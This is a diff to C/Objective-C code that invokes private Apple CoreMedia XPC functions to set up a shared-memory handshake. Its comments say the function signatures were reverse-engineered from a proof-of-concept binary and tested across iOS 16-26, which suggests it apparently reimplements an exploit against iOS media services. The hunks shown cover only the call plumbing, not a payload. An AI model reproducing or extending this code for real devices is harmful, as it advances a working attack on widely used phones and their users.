@@ -42,14 +42,27 @@ static void _load_xpc_conn(void) {
 #define FIG_TIMEOUT_NS   (10LL * NSEC_PER_SEC)
 
 // ── CoreMedia private symbol typedefs ─────────────────────────────────────────
-// All Fig* message args are xpc_object_t (xpc_dictionary under the hood).
-// Using xpc_object_t directly — no CF bridging, no cast gymnastics.
+// Signatures verified against PoC binary disassembly (ARM64 call sites):
+//
+//   FigXPCCreateBasicMessage(uint32_t fourcc, uint64_t flags) → xpc_object_t
+//     Returns msg1 directly in x0; no output-pointer arg.
+//     Fourcc = 0x2e6f7267 ('.org') — confirmed from PoC movz/movk sequence.
+//
+//   FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1
+//     (xpc_connection_t conn, xpc_object_t msg1) → int32_t status
+//     Fills msg1 in-place with the shm handshake; conn needed for service context.
+//
+//   FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2
+//     (void **outRecip, xpc_object_t msg1, xpc_object_t msg2) → int32_t
+//
+//   FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2
+//     (xpc_connection_t conn, xpc_object_t msg2) → int32_t
 
-typedef int32_t (*PFN_CreateMsg)(uint32_t fourcc, uint64_t flags, xpc_object_t *outMsg);
-typedef int32_t (*PFN_SetURL)(xpc_object_t msg, CFURLRef url);
-typedef int32_t (*PFN_OriginBegin)(void **outOrigin, xpc_object_t msg1);
-typedef int32_t (*PFN_RecipCreate)(void **outRecip, xpc_object_t msg1, xpc_object_t msg2);
-typedef int32_t (*PFN_OriginComplete)(void *origin, xpc_object_t msg2);
+typedef xpc_object_t (*PFN_CreateMsg)(uint32_t fourcc, uint64_t flags);
+typedef int32_t      (*PFN_SetURL)(xpc_object_t msg, CFURLRef url);
+typedef int32_t      (*PFN_OriginBegin)(xpc_connection_t conn, xpc_object_t msg1);
+typedef int32_t      (*PFN_RecipCreate)(void **outRecip, xpc_object_t msg1, xpc_object_t msg2);
+typedef int32_t      (*PFN_OriginComplete)(xpc_connection_t conn, xpc_object_t msg2);
 
 static struct {
     PFN_CreateMsg      createMsg;
@@ -125,9 +138,10 @@ static xpc_object_t sendSync(xpc_connection_t conn, xpc_object_t msg) {
 
     NSData *result = nil;
 
-    xpc_object_t msg1 = NULL;
-    int32_t cst = sFig.createMsg(0x2e727031u, 0, &msg1);
-    if (cst || !msg1) { err = figErr(4, [NSString stringWithFormat:@"FigXPCCreateBasicMessage status=%d", cst]); goto done; }
+    // fourcc 0x2e6f7267 = '.org' — verified from PoC ARM64 movz/movk at call site.
+    // FigXPCCreateBasicMessage returns xpc_object_t directly (no output-pointer).
+    xpc_object_t msg1 = sFig.createMsg(0x2e6f7267u, 0);
+    if (!msg1) { err = figErr(4, @"FigXPCCreateBasicMessage returned nil"); goto done; }
 
     {
         int32_t st = sFig.setURL(msg1, (CFURLRef)fileURL);
@@ -136,9 +150,9 @@ static xpc_object_t sendSync(xpc_connection_t conn, xpc_object_t msg) {
             xpc_release(msg1); goto done;
         }
 
-        void *origin = NULL;
-        st = sFig.originBegin(&origin, msg1);
-        if (st || !origin) {
+        // FigMemoryOriginBegin takes (conn, msg1) — fills msg1 with shm payload in-place.
+        st = sFig.originBegin(conn, msg1);
+        if (st) {
             err = figErr(6, [NSString stringWithFormat:@"OriginBegin status=%d", st]);
             xpc_release(msg1); goto done;
         }
@@ -152,14 +166,14 @@ static xpc_object_t sendSync(xpc_connection_t conn, xpc_object_t msg) {
         }
 
         void *recip = NULL;
-        // shortcut: passing msg2 for both args works on iOS 16-26 per PoC behaviour.
         st = sFig.recipCreate(&recip, msg2, msg2);
         if (st || !recip) {
             err = figErr(8, [NSString stringWithFormat:@"RecipientCreate status=%d", st]);
             xpc_release(msg2); goto done;
         }
 
-        st = sFig.originComplete(origin, msg2);
+        // FigMemoryOriginComplete takes (conn, msg2) — mirrors OriginBegin signature.
+        st = sFig.originComplete(conn, msg2);
         xpc_release(msg2);
         if (st) { err = figErr(9, [NSString stringWithFormat:@"OriginComplete status=%d", st]); goto done; }
 
